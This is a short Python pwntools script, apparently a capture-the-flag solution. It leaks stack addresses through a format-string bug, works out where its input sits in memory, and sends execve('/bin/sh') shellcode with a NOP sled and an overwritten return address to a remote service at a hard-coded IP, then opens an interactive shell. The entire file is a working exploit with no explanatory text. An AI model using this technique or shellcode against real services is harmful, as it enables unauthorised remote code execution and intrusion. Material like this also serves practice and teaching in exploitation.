from pwn import *

#  Compile using: gcc -o pwn4 pwn4 -fno-stack-protector -no-pie

# p = remote('127.0.0.1', 1024)
p = remote("3.142.26.175", 1337)
# p = process("./real_hack")

context.arch = 'amd64'
message = p.recv()
print(message)


format_string = '%p '*15

p.sendline(format_string)

resp = p.recvuntil("Where is the flag anyway?")

addr_on_stack = resp.split(b"\n")[2].split()[-2]    # [2] if server, [1] locally

print(addr_on_stack)

addr_on_stack = int(addr_on_stack, 16)

input_addr = 0x7ffc3c2832d0
stack_addr = 0x7ffc3c283330


my_input_addr = addr_on_stack - (stack_addr - input_addr)

print(hex(my_input_addr))

input("Attach gdb")

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = shellcode + b'\x90'*(0x48 - len(shellcode)) + p64(my_input_addr)

p.sendline(payload)

p.interactive()